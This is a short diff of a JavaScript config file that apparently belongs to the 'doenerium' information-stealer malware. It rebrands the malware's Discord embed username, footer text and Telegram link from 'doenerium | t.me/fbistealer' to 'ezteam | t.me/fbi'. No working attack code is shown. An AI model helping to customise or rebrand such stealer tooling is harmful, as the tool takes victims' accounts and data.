@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | t.me/fbistealer",
+        username: "ezteam | t.me/fbir",
         footer: {
-            text: `doenerium | t.me/fbistealer`,
+            text: `ezteam | t.me/fbi`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/fbistealer",
+        href: "https://t.me/fbi",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
